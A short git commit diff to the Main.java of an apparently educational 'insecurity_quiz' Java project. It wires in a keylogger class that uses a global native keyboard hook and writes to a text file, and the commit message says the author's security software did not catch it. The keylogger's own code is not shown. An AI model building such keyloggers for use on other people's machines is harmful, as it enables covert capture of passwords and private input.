50cd2fd4ea46fd115941ae4bfac7d7031c979582
John-Ming-Ngo <john.ming.ngo@gmail.com>
2023-04-01 18:18:07 -0600

    Basic keylogger done... it was... stupidly easy... and my security just let it through... what the hell???

--- src/main/java/org/insecurity_quiz/Main.java
+++ src/main/java/org/insecurity_quiz/Main.java
@@ -1,7 +1,24 @@
 package org.insecurity_quiz;
 
+import com.github.kwhat.jnativehook.GlobalScreen;
+import com.github.kwhat.jnativehook.NativeHookException;
+import org.insecurity_quiz.Advanced_Security_Implementations.Keylogger;
+
+import java.io.IOException;
+
 public class Main {
     public static void main(String[] args) {
         System.out.println("Hello world!");
+        Keylogger keylogger;
+        try {
+            keylogger = new Keylogger("Test.txt");
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        } catch (NativeHookException e) {
+            System.out.println("Well, didn't hook.");
+        }
+        while (true) {
+            // Do something
+        }
     }
 }
